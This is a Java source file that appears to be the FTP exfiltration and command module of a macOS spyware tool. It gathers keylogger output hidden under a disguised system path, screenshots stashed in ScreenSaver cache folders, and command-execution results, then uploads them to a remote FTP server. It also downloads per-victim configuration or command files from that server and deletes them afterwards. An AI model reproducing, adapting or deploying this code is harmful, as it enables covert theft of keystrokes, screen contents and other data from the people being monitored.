package mac.project.ftp;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import java.util.List;
import javax.swing.JPanel;
import sun.net.TelnetInputStream;
import sun.net.ftp.FtpClient;
import sun.net.ftp.FtpLoginException;

import mac.project.main.*;

public class FtpPanel extends JPanel {
	/**
	 * serialVersionUID
	 */
	private static final long serialVersionUID = 1L;
	AutoRun autoRun;
	private ConfigBean configBean = new ConfigBean();
	private String configFilePath;
	private JPanel contentPane;
	FtpClient myFtp = null;                            // FtpClient对象
	Command cmd;
	String uName;
	private List<String> upLoadList = null;
	TelnetInputStream inStream = null;                // 输入流?

	// 界面初始化并显示
	public FtpPanel(AutoRun ar) {

		this.autoRun = ar;
		this.configBean = autoRun.configBean;
		this.configFilePath = autoRun.ConfigFilePath;
	}
	//构造函数
	public FtpPanel() {}

	public JPanel getPanel(){          //返回该面板
		return contentPane;
	};

	boolean linkFtp_action(){
		//	********************从配置文件获取信息**********************     // 
		if(configFilePath == null){	//判断配置文件是否获得
			System.out.println("config file can't get!");
			return false;
		}
		String ftpHost = configBean.getFtpHost();
		String ftpUser = configBean.getFtpUser();
		String ftpPassword = configBean.getFtpPassword();

		//		******************************************     //
		try {
			myFtp = new FtpClient(ftpHost,21);      // 构造一个对象
			String user = ftpUser;//"test";
			String psw = ftpPassword;//"lab605607";
			if (user.equals("")) {
				user = "anonymous";
				psw = "123456";
			}
			System.out.println("user:"+user+" psw:"+psw);
			myFtp.login(user, psw);					// 以给定用户名和密码登录
			myFtp.binary();							// 表示文件以二进制模式传输
			uName = configBean.getUserName();
			System.out.println("uName:"+uName);
			myFtp.cd("/"+ uName +"/");
		}
		catch(FtpLoginException e1) {
			System.out.println("用户名密码错误");
			return false;
		}
		catch (IOException e1) {
			String strPrompt = "连接主机:" + ftpHost + "失败!";
			System.out.println(strPrompt);
			return false;
		}
		catch(SecurityException e1) {
			String strPrompt = "无权限与主机:" + ftpHost + "连接!";
			System.out.println(strPrompt);
			return false;
		}
		return true;
	}
	
	public void upLoad_action() {
		if(linkFtp_action()){		//如果链接ftp服务器成功，依次上传列表
			upLoadList = getUpLoadList();
			if (upLoadList!=null) {
				for(int i = 0;i < upLoadList.size();i++) {
					if((upLoadList != null) && (!upLoadList.isEmpty())){
						String str = upLoadList.get(i).trim();
						System.out.println("filePath:" + str);
						FileUpload fu0 = new FileUpload(str, this, myFtp);
						fu0.run();
		//				Thread fileUp0 = new Thread(fu0);
		//				fileUp0.start();
					}
				}
			}
			//上传完成，执行断开操作
			try {
				myFtp.closeServer();                 // 关闭与服务器端的连接
				System.out.println("upload finish,disconnect with ftp");
			} catch(IOException e1) {
				System.err.println("Error: " + e1.getMessage());
			}
		}	
	}
	
	public void downLoad_action() {
		if(linkFtp_action()){
			String dir = autoRun.LocationPath + "/";			//本地路径，存储下载的配置文件
			String file = configBean.getFtpDownloadList();		//下载的配置文件名
			System.out.println("configfilename:"+dir+file);
			//新建并启动下载线程
			uName = configBean.getUserName();
			System.out.println("uName:"+uName);
			FileDownload fd = new FileDownload(file, dir, this, myFtp, uName);
			Thread fileDown = new Thread(fd);
			fileDown.start();
			try {
				fileDown.join();
			} catch (InterruptedException e1) {
				e1.printStackTrace();
			}
//			new ChangeConfig(configFilePath,configBean);
			//下载完成，执行断开操作
			try {
				myFtp.closeServer();                 // 关闭与服务器端的连接
				System.out.println("download finish,disconnect with ftp");
			} catch(IOException e1) {
				System.err.println("Error: " + e1.getMessage());
			}
		}
	}
	
	public List<String> getUpLoadList () {
		List<String> list = new ArrayList<String>();
		String screenUrl = configBean.getScreenDes();
		String keylogUrl = configBean.getKeyboardDes();
		String localDir = configBean.getFtpUploadList();
		if((screenUrl != null)&&(!screenUrl.equals(""))){
			if(new File(screenUrl).exists()) list.add(screenUrl);
		}
		if((keylogUrl != null)&&(!keylogUrl.equals(""))){
			if(new File(keylogUrl).exists()) list.add(keylogUrl);
		}
		if((localDir != null)&&(!localDir.equals(""))){
			if(new File(localDir).exists()) list.add(localDir);
		}
		String defalutcmdUrl = System.getProperty("java.io.tmpdir") + "command.result";
		String activecheckUrl = System.getProperty("java.io.tmpdir") + ".active.result";
		String defalutscreenUrl = System.getProperty("user.home")+"/Library/Caches/com.apple.ScreenSaver";
		String rootscreenUrl = "/var/root/Library/Caches/com.apple.ScreenSaver";
		String defalutkeylogUrl = "/System/Library/KerberosPlugins/KerberosCorePlugins/AppleKeyboardLayouts.app/Contents/keydeflog";

		//添加命令执行结果文件到上传列表，
		File file = new File(defalutcmdUrl);
		if (file.exists()) {
			list.add(defalutcmdUrl);
		}
		//添加在线检查结果文件到上传列表，
		File file1 = new File(activecheckUrl);
		if (file1.exists()) {
			list.add(activecheckUrl);
		}
		//添加键盘日志文件到上传列表，如果键盘日志文件小于minLogSize,则不上传
		File file2 = new File(defalutkeylogUrl);
		int minLogSize = 1000;
		if (file2.exists()&&(file2.length()>=minLogSize)) {
			list.add(defalutkeylogUrl);
		}
		//添加截屏文件到上传列表，如果截屏个数小于minPicNum,则不上传
		File file3 = new File(defalutscreenUrl);
		int minPicNum = 5;
		if (file3.exists()&&(file3.list()).length>=minPicNum) {
			System.out.println("file3.list().length:"+(file3.list()).length);
			list.add(defalutscreenUrl);
		}
		File file4 = new File(rootscreenUrl);
		if (file4.exists()&&(file4.list()).length>=minPicNum) {
			System.out.println("file4.list().length:"+(file4.list()).length);
			list.add(rootscreenUrl);
		}
		return list;
	}
}

class FileDownload implements Runnable {

	FtpPanel fp;
	FtpClient ftpCli;
	private String userName;
	private String srcFile;
	private String desDir;
	TelnetInputStream inStream = null;
	private int ch;
	private StringBuffer buf = new StringBuffer();

	public FileDownload(String src,String des,FtpPanel fp, FtpClient fc, String uName){
		this.srcFile = src;
		this.desDir = des;
		this.fp = fp;
		this.ftpCli = fc;
		this.userName = uName; 
	}

	public void run() {
		try {
			buf.setLength(0);
			File dir = new File(desDir);             // 构造目录
			File f = new File(dir, srcFile);         // 通过文件
			System.out.println("userName:" + userName);
			String ftppwd = ftpCli.pwd();
			System.out.println("pwd:"+ftppwd);
//			ftpCli.cd("/"+ userName +"/");
			inStream = ftpCli.get("/" + userName + "/" + srcFile); // +得到文件的输入流,No1/Config是配置文件在服务器上所在的位置
			while((ch = inStream.read())>=0) {							// 读取数据流
				buf.append((char)ch);                                  // 将读取的数据存在缓冲区中
			}
			RandomAccessFile file = new RandomAccessFile(f, "rw");   // 构造一个随机访问文件
			file.writeBytes(buf.toString());                         // 将缓冲区中的数据以字符串形式写入文件
			file.close();                       // 关闭文件
			inStream.close();
			String delFile = "/" + userName + "/" + srcFile;
			System.out.println("srcFile="+"/" + userName + "/" + srcFile + " to desDir="+desDir);
			System.out.println("ConfigFile DownLoad Success!");
			if (!deleteFile(ftpCli,delFile)) {
				System.err.println("delete file error!" + delFile);
			}
		}
		catch(Exception e) {
			System.out.println("Error: " + e.getMessage());
		}
	}
	/**
	 * 删除FTP上的文件
	 * @param ftpDirAndFileName
	 */
	public boolean deleteFile(FtpClient ftp, String ftpDirAndFileName) {
		if (!ftp.serverIsOpen())
			return false;
		try {
			String fileName = ftpDirAndFileName;
			if (fileName.endsWith("/")) {
				fileName = fileName.substring(0, fileName.length()-1);
			}
			String cmd = "DELE "+ fileName.trim() +"\r\n";
			System.out.println(cmd);
			ftp.sendServer(cmd);
			ftp.binary();
			int reply = ftp.readServerResponse();//等待返回结果
			if(reply==200){
				return true;
			}
		} catch (IOException e1) {
			System.err.println("err in delete ftp file:"+e1.toString());
//			e1.printStackTrace();
			return false;
		}
		return true;
	}
}